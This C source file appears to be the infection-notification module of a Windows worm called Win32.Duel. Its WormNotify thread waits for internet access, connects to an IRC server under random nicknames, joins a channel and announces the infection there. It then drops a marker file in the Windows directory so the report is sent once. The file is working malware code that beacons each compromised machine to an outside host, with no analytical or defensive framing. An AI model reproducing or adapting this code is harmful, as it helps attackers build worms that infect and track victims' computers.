#include "stdafx.h"
#include "prototypes.h"
#include "winsock2.h"

//a module to make a notify of infection

const char irc_server[]="irc.undernet.org";
const char irc_channel[]="#ubergeeks";
const char infection_msg[]="..:[Win32.Duel]:..";

const char checkfile[]="\\duel_2006.bin";

char buffer[4096];
SOCKET Irc_Socket;

int myrecv()
{
	memset(buffer,0,sizeof(buffer));					//zero buffer
	return(recv(Irc_Socket,buffer,sizeof(buffer),0));
}

DWORD WINAPI WormNotify(LPVOID xvoid)
{
	char checkf[MAX_PATH];
	WSADATA wsd;
	char user[20],realname[30],nick[20],*p1=NULL,ping_id[50];	
	LPHOSTENT	xhostnt;
	sockaddr_in	xsin;
	int i;
	BOOL NotifySuccess=FALSE;

	AddToLog("Notify Thread Created",Duel_Log_Custom,TRUE);

	GetWindowsDirectory(checkf,MAX_PATH);
	lstrcat(checkf,checkfile);

	if(GetFileAttributes(checkf)==0xFFFFFFFF)
	{
		WaitForInetConnection();

		if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
		{
			for(;NotifySuccess!=TRUE;Sleep(5000))
			{
				Irc_Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);		//create socket
	
				if(Irc_Socket!=INVALID_SOCKET)
				{
					xhostnt=gethostbyname(irc_server);		//dns irc server
				
					if(xhostnt!=NULL)
					{
						xsin.sin_family=AF_INET;
						xsin.sin_port=htons(6667);
						xsin.sin_addr=*((LPIN_ADDR)*xhostnt->h_addr_list);

						if(connect(Irc_Socket,(LPSOCKADDR)&xsin,
							sizeof(struct sockaddr))!=SOCKET_ERROR)	//connect server
						{
							Sleep(3000);	//sleep 3 seconds
							myrecv();
					
							RandomString(user,5,FALSE);
							RandomString(realname,8,FALSE);
							RandomString(nick,8,FALSE);
							CharLower(user),

							wsprintf(buffer,"USER %s 8 * :%s\r\n",user,realname);
							send(Irc_Socket,buffer,lstrlen(buffer),0);
							wsprintf(buffer,"NICK %s\r\n",nick);
							send(Irc_Socket,buffer,lstrlen(buffer),0);
	
							myrecv();

							p1=strstr(buffer,"PING :");

							if(p1!=NULL)		//some servers sending ping right after user registion
							{
								p1+=6;
								i=0;
								do
								{
									ping_id[i]=*p1;
									i++;
									p1++;
								}while(*p1!=0xd);

								wsprintf(buffer,"PONG %s\r\n",ping_id);		//build PONG command
								send(Irc_Socket,buffer,lstrlen(buffer),0);	//send PONG command

								myrecv();	//recive message from server
							}

							p1=strstr(buffer,"001");
	
							if(p1!=NULL)
							{
								wsprintf(buffer,"JOIN %s\r\n",irc_channel);
								send(Irc_Socket,buffer,lstrlen(buffer),0);

								Sleep(1500);

								wsprintf(buffer,"PRIVMSG %s :%s\r\n",irc_channel,infection_msg);
								send(Irc_Socket,buffer,lstrlen(buffer),0);
							
								Sleep(3000);


								wsprintf(buffer,"QUIT %s\r\n",infection_msg);
								send(Irc_Socket,buffer,lstrlen(buffer),0);

								Sleep(3000);

								CloseHandle(CreateFile(checkf,GENERIC_WRITE,0,NULL,
									CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL));

								AddToLog("!",Duel_Log_Notify,TRUE);

								NotifySuccess=TRUE;
							}
						
						}
					}
					closesocket(Irc_Socket);
				}
			}
		}
	}
	return 1;
}